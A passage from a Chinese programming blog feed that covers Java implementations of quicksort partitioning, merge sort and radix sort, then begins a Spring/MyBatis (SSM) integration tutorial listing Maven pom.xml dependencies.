class="comment">//若是末尾元素&gt;=基准，则不用移动,下标左移</span></span><br><span class="line">        <span class="keyword">while</span> (left&lt;right &amp;&amp; array[right]&gt;=indexVal)&#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//若是末尾元素&lt;基准，则覆盖下标为right元素</span></span><br><span class="line">        array[left]=array[right];</span><br><span class="line">        <span class="comment">//若是队首元素&lt;=基准，则不用移动,下标右移</span></span><br><span class="line">        <span class="keyword">while</span> (left&lt;right &amp;&amp; array[left]&lt;= indexVal)&#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//若是队首元素&gt;基准，则覆盖下标为left元素</span></span><br><span class="line">        array[right]=array[left];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//left==right,为基准下标</span></span><br><span class="line">    array[left]=indexVal;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="双指针法"><a href="#双指针法" class="headerlink" title="双指针法"></a>双指针法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 快排之双指针法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition2</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=start;</span><br><span class="line">    <span class="keyword">int</span> j=end;</span><br><span class="line">    <span class="keyword">int</span> indexVal=arr[end];</span><br><span class="line">    <span class="keyword">while</span> (i&lt;j)&#123;</span><br><span class="line">        <span class="comment">//右边找到大于枢轴</span></span><br><span class="line">        <span class="keyword">while</span> (i&lt;j &amp;&amp; arr[i]&lt;=indexVal)&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左边找到小于枢轴</span></span><br><span class="line">        <span class="keyword">while</span> (i&lt;j &amp;&amp; arr[j]&gt;=indexVal)&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr,i,j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使得枢轴位于分界点</span></span><br><span class="line">    swap(arr,i,end);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="三分单向优化"><a href="#三分单向优化" class="headerlink" title="三分单向优化"></a>三分单向优化</h3><p>​        对于这样一个序列 2,2,2,2,3,1，选择第一个元素2 作为 pivot 中心点，划分后得到两段子序列分别为：1和2,2,3,2，接着继续递归对子序列进行排序，对于 2,2,3,2 子序列又是将 2 作为 pivot 中心点，会发现对于这种大量元素等于 pivot 的序列<strong>单轴快排</strong>并没有起到很好的划分作用。</p>
<p>如果将等于 pivot 的元素也作为一个划分区段，则可以将序列划分为3段：</p>
<ul>
<li>小于 pivot 的元素</li>
<li>等于 pivot 的元素</li>
<li>大于 pivot 的元素。这种处理方式，会大大节省递归次数</li>
</ul>
<p><img src="https://csn.damyoung.cn/2510824-dab14d648daa9ef1.png" alt="img"></p>
<p><strong>算法思路：</strong></p>
<ol>
<li><p>由于最初红色和蓝色区域没有元素，初始化 <code>less = left - 1，more = right + 1，cur = left</code>。整个区间为未知部分（白色</p>
</li>
<li><p>如果当前 array[cur] &lt; v，则 <code>swap(array,++less,cur++)</code>，即把红色区域向右扩大一格（less指针后移），把 array[cur] 交换到该位置，cur 指针前移判断下一个数。</p>
</li>
<li><p>如果当前 array[cur] = v，则不必交换，直接 <code>cur++</code></p>
</li>
<li><p>如果当前 array[cur] &gt; v，则 <code>swap(array,--more,cur)</code>，即把蓝色区域向左扩大一格（more指针前移），把 array[cur] 交换到该位置。<strong>特别注意！此时cur指针不能前移，这是因为交换到cur位置的元素来自未知区域，还需要进一步判断array[cur]。</strong></p>
</li>
</ol>
<h3 id="随机边界"><a href="#随机边界" class="headerlink" title="随机边界"></a>随机边界</h3><p>每次随机选取基准值，而不是固定选取左或右边界值。<strong>将随机选取的基准值和右边界值进行交换</strong>，然后就回到了之前的解法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//随机边界优化</span></span><br><span class="line"><span class="keyword">int</span> random=(<span class="keyword">int</span>)(start+Math.random()*(end-start+<span class="number">1</span>));</span><br><span class="line">swap(arr,random,end);</span><br></pre></td></tr></table></figure>

<h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><p><strong>分治策略</strong></p>
<p><strong>思想</strong>：合并已有序的子序列，得到完全有序的序列；</p>
<p><strong>步骤</strong>：使得每一个子序列有序，再使子序列段间有序；归并排序的形式就是一棵二叉树，它需要遍历的次数就是二叉树的深度</p>
<p><strong>时间复杂度：</strong>可以得出它在任何情况下时间复杂度均是<code>O(nlogn)</code>。</p>
<img src="https://csn.damyoung.cn/1557906108-5066-20161218163120151-452283750.png" alt="img" style="zoom: 33%;" />

<p><img src="https://csn.damyoung.cn/image-20200906215310091.png" alt="image-20200906215310091"></p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzA1NTcwNDMtMzczNzUwMTAuZ2lm" alt="image"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 合并俩个有序序列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] merge(<span class="keyword">int</span>[] left,<span class="keyword">int</span>[] right)&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//定义一个新数组,用于合并俩个有序数组</span></span><br><span class="line">    <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[left.length+ right.length];</span><br><span class="line">    <span class="keyword">while</span> (i&lt;left.length &amp;&amp; j&lt;right.length)&#123;</span><br><span class="line">        <span class="keyword">if</span> (left[i]&lt;=right[j])&#123;</span><br><span class="line">            result[k++]=left[i++];</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            result[k++]=right[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i&lt;left.length)&#123;</span><br><span class="line">        result[k++]=left[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j&lt;right.length)&#123;</span><br><span class="line">        result[k++]=right[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 归并排序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] mergeSort(<span class="keyword">int</span>[] arr)&#123;</span><br><span class="line">    <span class="comment">//递归结束条件</span></span><br><span class="line">    <span class="keyword">if</span> (arr.length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=arr.length/<span class="number">2</span>;</span><br><span class="line">    <span class="comment">//将给定数组分解成俩个字数组</span></span><br><span class="line">    <span class="keyword">int</span>[] left=Arrays.copyOfRange(arr,<span class="number">0</span>,mid);</span><br><span class="line">    <span class="keyword">int</span>[] right=Arrays.copyOfRange(arr,mid,arr.length);</span><br><span class="line">    <span class="comment">//递归调用</span></span><br><span class="line">    <span class="keyword">int</span>[] leftMergeSort=mergeSort(left);</span><br><span class="line">    <span class="keyword">int</span>[] rightMergeSort=mergeSort(right);</span><br><span class="line">    <span class="comment">//合并俩个有序数组</span></span><br><span class="line">    <span class="keyword">return</span> merge(leftMergeSort,rightMergeSort);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><p>radix sort，基数排序和桶排序相似，基数排序是桶排序的扩展，根据数组最大元素位数进行多次的桶排序，*<em>基数排序空间复杂度为T(n) = O(n * k)*</em>，k是指数组最大数的位数</p>
<p>基数排序时<strong>稳定</strong></p>
<h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p>桶排序，用<strong>空间换时间的</strong>经典排序算法，海量数据排序时，容易造成 <code>OutOfMemoryError</code>内存溢出错误，时间复杂度为<code>T(n)=O(n+k)</code></p>
<p><img src="https://csn.damyoung.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzIxMDcwOTAtMTkyMDcwMjAxMS5wbmc" alt="image"></p>
<h2 id="桶排序-1"><a href="#桶排序-1" class="headerlink" title="桶排序"></a>桶排序</h2><ul>
<li>取得数组中的最大数，并取得<strong>位数</strong></li>
<li>array 为原始数组，从最低位开始取每个位组成 radix 数组<ul>
<li>将每个元素的<strong>个</strong>位数取出，看这个数应该放在哪一个桶，并按桶顺序取出元素组成数组</li>
<li>将每个元素的<strong>十</strong>位数取出，看这个数应该放在哪一个桶，并按桶顺序取出元素组成数组</li>
<li>…….</li>
</ul>
</li>
<li>对 <code>radix</code> 数组进行基数排序（利用基数排序适用于小范围数的特点）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 桶排序</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">radixSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max=arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (max&lt;arr[i])&#123;</span><br><span class="line">            max=arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求数组中最大数的位数</span></span><br><span class="line">    <span class="keyword">int</span> maxLength =(max+<span class="string">&quot;&quot;</span>).length();</span><br><span class="line">    System.out.println(maxLength);</span><br><span class="line">    <span class="comment">//定义一个二维数组表示10个桶,每个桶就是一个一维数组</span></span><br><span class="line">    <span class="keyword">int</span>[][] bucket=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>][arr.length];</span><br><span class="line">    <span class="comment">//用来记录每个桶中存放数据的多少</span></span><br><span class="line">    <span class="keyword">int</span>[] bucketElementCounts=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>,n=<span class="number">1</span>; i &lt; maxLength; i++,n*=<span class="number">10</span>) &#123;</span><br><span class="line">        <span class="comment">//针对每个元素的对应位数进行排序处理，第一次是个位arr[j]%10，第二次就是十位数arr[j]/10%10.....</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value : arr)&#123;</span><br><span class="line">            <span class="keyword">int</span> digitOfElement=value/n % <span class="number">10</span>;</span><br><span class="line">            <span class="comment">//默认bucketElementCounts[digitOfElement]==0</span></span><br><span class="line">            bucket[digitOfElement][bucketElementCounts[digitOfElement]]=value;</span><br><span class="line">            bucketElementCounts[digitOfElement]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; bucket.length; j++) &#123;</span><br><span class="line">            <span class="comment">//桶不为空</span></span><br><span class="line">            <span class="keyword">if</span> (bucketElementCounts[j]!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//对桶中元素进行遍历,放入到radix数组中</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; bucketElementCounts[j]; k++) &#123;</span><br><span class="line">                    <span class="comment">//取出元素放到arr中</span></span><br><span class="line">                    arr[index++]=bucket[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//每次处理后将每个bucketElementCounts[k]=0！！！</span></span><br><span class="line">            bucketElementCounts[j]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;第&quot;</span>+(i+<span class="number">1</span>)+<span class="string">&quot;轮的排序&quot;</span>+Arrays.toString(arr));</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ssm整合</title>
    <url>/2020/11/15/06SSM%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<h2 id="搭建整合的环境"><a href="#搭建整合的环境" class="headerlink" title="搭建整合的环境"></a>搭建整合的环境</h2><h3 id="创建Spring项目"><a href="#创建Spring项目" class="headerlink" title="创建Spring项目"></a>创建Spring项目</h3><p>创建pojo,mapper,service,controller模块</p>
<a id="more"></a>

<h4 id="配置pom-xml"><a href="#配置pom-xml" class="headerlink" title="配置pom.xml"></a>配置pom.xml</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 切面依赖 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        aspectj是一个AOP框架，本身是基于静态代理，对java代码进行AOP编译，本身是一门语言，拥有专门的编译器--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        Spring 只是使用了与 AspectJ 5 一样的注解，但仍然没有使用 AspectJ 的编译器--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjrt --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjrt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span> 1.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--        junit测试框架  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.40<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span> 1.0.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.mangofactory/swagger-springmvc --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mangofactory<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-springmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--       将JavaBean转化为json格式--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span> 2.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--ibeetl视图解析器--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.ibeetl/beetl --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ibeetl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>beetl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis-spring --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--        cglib代理，字节码库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib-integration-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--        文件上传--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="配置tomcat容器"><a href="#配置tomcat容器" class="headerlink" title="配置tomcat容器"></a>配置tomcat容器</h4><h3 id="Spring环境"><a href="#Spring环境" class="headerlink" title="Spring环境"></a>Spring环境</h3><p>创建applicationContext.xml配置文件</p>
